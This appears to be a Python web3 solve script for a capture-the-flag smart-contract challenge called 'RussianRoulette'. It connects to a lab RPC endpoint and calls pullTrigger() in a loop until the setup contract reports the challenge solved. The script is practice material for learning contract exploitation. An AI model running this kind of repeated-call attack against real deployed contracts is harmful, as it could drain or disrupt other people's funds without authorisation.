from web3 import Web3


abi_contract = '''[
        {
            "type": "constructor",
            "inputs": [],
            "stateMutability": "payable"
        },
        {
            "type": "function",
            "name": "pullTrigger",
            "inputs": [],
            "outputs": [
                {
                    "name": "",
                    "type": "string",
                    "internalType": "string"
                }
            ],
            "stateMutability": "nonpayable"
        }
]'''

abi_setup = '''[
        {
            "type": "constructor",
            "inputs": [],
            "stateMutability": "payable"
        },
        {
            "type": "function",
            "name": "TARGET",
            "inputs": [],
            "outputs": [
                {
                    "name": "",
                    "type": "address",
                    "internalType": "contract RussianRoulette"
                }
            ],
            "stateMutability": "view"
        },
        {
            "type": "function",
            "name": "isSolved",
            "inputs": [],
            "outputs": [
                {
                    "name": "",
                    "type": "bool",
                    "internalType": "bool"
                }
            ],
            "stateMutability": "view"
        }
]'''

w3 = Web3(Web3.HTTPProvider('http://94.237.60.112:48694'))
contract = w3.eth.contract(address='0x4a0D8879115989490e3DC44909D79e3C56Aa2679', abi=abi_contract)
setup = w3.eth.contract(address='0xc53ac80da7ee04B1735C54D4A8b659cdE6FC7633', abi=abi_setup)

while True:
    is_solved = setup.functions.isSolved().call()
    if is_solved:
        break
    
    tx_hash = contract.functions.pullTrigger().transact()
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print("Pulling the trigger...", tx_receipt)